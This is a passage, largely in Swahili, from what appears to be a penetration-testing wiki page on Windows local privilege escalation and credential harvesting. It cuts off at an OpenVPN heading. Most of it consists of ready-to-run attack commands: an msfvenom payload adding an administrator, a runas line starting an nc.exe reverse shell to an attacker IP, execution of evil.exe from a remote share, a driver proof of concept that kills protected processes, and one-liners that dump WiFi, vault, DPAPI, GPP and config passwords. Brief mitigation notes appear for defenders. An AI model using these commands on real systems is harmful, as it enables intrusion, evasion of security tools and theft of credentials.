Ikiwa njia ya executable haiko ndani ya quotes, Windows itajaribu kutekeleza kila sehemu ya mwisho kabla ya space.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha service paths zote zisizo na quotation marks, ukiondoa zile zinazoendana na built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metaspoloit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mikono binary ya service kwa kutumia metaspoloit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejeshaji

Windows huruhusu watumiaji kubainisha hatua za kuchukuliwa ikiwa huduma itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation linaweza kuwa possible. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Angalia **permissions of the binaries** (huenda ukaweza ku-overwrite moja na escalate privileges) na **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani ya config ili kusoma faili maalum au ikiwa unaweza kurekebisha binary fulani ambayo itatekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kupata weak folder/files permissions kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ hu-autoload DLL yoyote ya plugin iliyo ndani ya subfolder zake za `plugins`. Ikiwa kuna install ya portable/copy inayoweza kuandikwa, kuacha plugin hasidi huleta automatic code execution ndani ya `notepad++.exe` kwenye kila launch (ikiwemo kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Angalia kama unaweza ku-overwrite registry au binary fulani ambayo ita-executed na user tofauti.**\
**Soma** **ukurasa ufuatao** ili ujifunze zaidi kuhusu interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta **third party weird/vulnerable** drivers zinazowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jika driver inafichua arbitrary kernel read/write primitive (kawaida katika IOCTL handlers zilizoundwa vibaya), unaweza kupandisha haki kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory. Tazama mbinu ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa race-condition bugs ambapo vulnerable call hufungua attacker-controlled Object Manager path, kupunguza kimakusudi kasi ya lookup (kwa kutumia max-length components au deep directory chains) kunaweza kupanua dirisha kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities hukuruhusu kufanya groom deterministic layouts, kutumia writable HKLM/HKU descendants vibaya, na kubadili metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze chain kamili hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya signed third‑party drivers huunda device object yao kwa strong SDDL kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL haitatekelezwa wakati device inapofunguliwa kupitia path iliyo na extra component, hivyo kumruhusu user yeyote asiye na haki kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwa case halisi)

Mara user anapoweza kufungua device, privileged IOCTLs zinazoonyeshwa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo wa mfano ulioonekana kwa vitendo:
- Kurudisha handles za full-access kwa arbitrary processes (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, mbinu za boot-time persistence).
- Kusimamisha arbitrary processes, ikiwemo Protected Process/Light (PP/PPL), kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- Daima weka FILE_DEVICE_SECURE_OPEN wakati wa kuunda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha caller context kwa shughuli zenye privileged. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusimamisha process au kurudisha handles.
- Weka mipaka kwa IOCTLs (access masks, METHOD_*, uthibitishaji wa input) na fikiria brokered models badala ya direct kernel privileges.

Detection ideas for defenders
- Fuatilia user-mode opens za majina ya suspicious device (mfano, \\ .\\amsdk*) na specific IOCTL sequences zinazoashiria abuse.
- Tekeleza Microsoft vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na dumisha allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder iliyopo kwenye PATH** unaweza kuweza hijack DLL inayopakiwa na process na **escalate privileges**.

Angalia permissions za folders zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kuutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Hii ni toleo la **Windows uncontrolled search path** linaloathiri programu za **Node.js** na **Electron** wanapofanya import ya moja kwa moja kama `require("foo")` na module inayotarajiwa **haipo**.

Node hutatua packages kwa kupanda juu kwenye mti wa saraka na kuangalia folda za `node_modules` kwenye kila parent. Kwenye Windows, hilo zoezi linaweza kufika mpaka root ya drive, hivyo programu iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kuangalia:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kupanda `foo.js` hasidi (au package folder) na kusubiri **higher-privileged Node/Electron process** itatue dependency inayokosekana. Payload itatekelezwa ndani ya security context ya mchakato wa mwathiriwa, hivyo hii inakuwa **LPE** kila mara lengo linapoendeshwa kama administrator, kutoka elevated scheduled task/service wrapper, au kutoka privileged desktop app inayojianzisha yenyewe.

Hili ni jambo la kawaida hasa wakati:

- dependency imetajwa katika `optionalDependencies`
- third-party library inafunga `require("foo")` ndani ya `try/catch` na inaendelea endapo itashindwa
- package iliondolewa kwenye production builds, ikaachwa wakati wa packaging, au imeshindwa kusakinishwa
- vulnerable `require()` iko ndani kabisa ya dependency tree badala ya kuwa kwenye main application code

### Hunting vulnerable targets

Tumia **Procmon** kuthibitisha resolution path:

- Filter by `Process Name` = target executable (`node.exe`, EXE ya Electron app, au wrapper process)
- Filter by `Path` `contains` `node_modules`
- Zingatia `NAME NOT FOUND` na open ya mwisho iliyofanikiwa chini ya `C:\node_modules`

Mifumo muhimu ya code-review katika `.asar` files zisizofungashwa au application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Utekelezaji wa shambulio

1. Tambua **jina la kifurushi kilichokosekana** kutoka Procmon au ukaguzi wa chanzo.
2. Unda saraka ya root lookup ikiwa haipo tayari:
```powershell
mkdir C:\node_modules
```
3. Dondosha module yenye jina halisi linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Chochea application ya mwathirika. Ikiwa application inajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya ulimwengu halisi ya modules za hiari zinazokosekana zinazolingana na pattern hii ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo sehemu inayoweza kutumika tena: tafuta **missing bare import** yoyote ambayo privileged Windows Node/Electron process itaitafsiri.

### Mawazo ya detection na hardening

- Toa alert wakati user anaunda `C:\node_modules` au anaandika `.js` mpya au packages hapo.
- Tafuta high-integrity processes zinazosomea kutoka `C:\node_modules\*`.
- Pakia dependencies zote za runtime kwenye production na kagua matumizi ya `optionalDependencies`.
- Pitia third-party code kwa patterns za kimya `try { require("...") } catch {}`.
- Zima optional probes wakati library inasaidia hilo (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka legacy `utf-8-validate` probe kwa `WS_NO_UTF_8_VALIDATE=1`).

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zinazojulikana zilizo hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Network Interfaces & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizo Wazi

Angalia **restricted services** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Kanuni za Firewall

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, tengeneza kanuni, zima, zima...)**

Zaidi[ amri za uchunguzi wa mtandao hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port itakuuliza kupitia GUI kama `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanzisha bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza filesystem ya `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault huhifadhi user credentials za servers, websites na programs nyingine ambazo **Windows** inaweza **kuwafanyia users login automatically**. Mwanzoni, hii inaweza kuonekana kama sasa users wanaweza kuhifadhi Facebook credentials, Twitter credentials, Gmail credentials n.k., ili ziweze ku-login automatically kupitia browsers. Lakini sivyo.

Windows Vault huhifadhi credentials ambazo Windows inaweza kuwatumia users ku-login automatically, ambayo inamaanisha kwamba application yoyote ya **Windows ambayo inahitaji credentials kufikia resource** (server au website) **inaweza kutumia hii Credential Manager** & Windows Vault na kutumia credentials zilizotolewa badala ya users kuingiza username na password kila wakati.

Isipokuwa applications ziwasiliane na Credential Manager, sidhani kama inawezekana kwao kutumia credentials kwa resource fulani. Kwa hiyo, application yako ikitaka kutumia vault, inapaswa kwa njia fulani **kuwasiliana na credential manager na kuomba credentials za resource hiyo** kutoka kwenye default storage vault.

Tumia `cmdkey` kuorodhesha stored credentials kwenye machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia vitambulisho vilivyohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` pamoja na seti ya credentials iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** hutoa njia ya symmetric encryption ya data, hasa ikitumika ndani ya Windows operating system kwa symmetric encryption ya asymmetric private keys. Encryption hii hutumia user au system secret ili kuchangia kwa kiasi kikubwa entropy.

**DPAPI huwezesha encryption ya keys kupitia symmetric key inayotokana na login secrets za user**. Katika hali zinazohusisha system encryption, hutumia system's domain authentication secrets.

Encrypted user RSA keys, kwa kutumia DPAPI, huhifadhiwa katika directory ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) ya user. **DPAPI key, iliyowekwa pamoja na master key inayolinda private keys za user katika file ileile**, kwa kawaida huwa na bytes 64 za random data. (Ni muhimu kutambua kuwa access kwenye directory hii imezuiwa, hivyo haiwezekani kuorodhesha contents zake kupitia `dir` command katika CMD, ingawa zinaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` kwa arguments zinazofaa (`/pvk` au `/rpc`) ili kuisimbua.

**credentials files** zinazolindwa na master password kwa kawaida zipo katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` na `/masterkey` inayofaa ili kuifungua.\
Unaweza **kutoa DPAPI nyingi** **masterkeys** kutoka kwenye **memory** kwa kutumia `sekurlsa::dpapi` module (kama wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** mara nyingi hutumiwa kwa **scripting** na majukumu ya automation kama njia ya kuhifadhi encrypted credentials kwa urahisi. Credentials hizi hulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida humaanisha zinaweza kufunguliwa tu na mtumiaji yule yule kwenye kompyuta ile ile zilipoundwa.

Ili **kufungua** PS credentials kutoka kwenye faili linaloziifadhi unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP Yaliyohifadhiwa

Unaweza kuyapata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na kwenye `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri Zilizotekelezwa Hivi Karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Visakinishaji vinaendeshwa kwa **SYSTEM privileges**, vingi vina udhaifu wa **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Files and Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Funguo za Host za Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Funguo za SSH katika registry

Funguo binafsi za SSH zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys` kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Ukipata ingizo lolote ndani ya njia hiyo huenda ni ufunguo wa SSH uliohifadhiwa. Umehifadhiwa kwa usimbaji fiche lakini unaweza kusimbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Taarifa zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana kama mbinu hii si halali tena. Nilijaribu kuunda baadhi ya ssh keys, kuyaongeza kwa `ssh-add` na kuingia kupitia ssh kwenye machine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikutambua matumizi ya `dpapi.dll` wakati wa asymmetric key authentication.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Hifadhi za nakala za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Cached GPP Pasword

Kipengele kilikuwa kinapatikana hapo awali kilichoruhusu kusambaza akaunti maalum za local administrator kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML ndani ya SYSVOL, zingeweza kufikiwa na user yeyote wa domain. Pili, passwords ndani ya hizi GPPs, zilizofichwa kwa AES256 kwa kutumia default key iliyoandikwa hadharani, zingeweza kufichuliwa na user yeyote aliyeauthenticated. Hii iliweka hatari kubwa, kwani ingeweza kuruhusu users kupata elevated privileges.

Ili kupunguza hatari hii, function ilitengenezwa kuchanganua locally cached GPP files zilizo na field ya "cpassword" ambayo si tupu. Baada ya kupata faili kama hilo, function hufichua password na kurudisha custom PowerShell object. Object hii inajumuisha details kuhusu GPP na location ya faili, ikisaidia katika utambuzi na kurekebisha vulnerability hii ya usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kufichua cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Hati za OpenVPN
```csharp
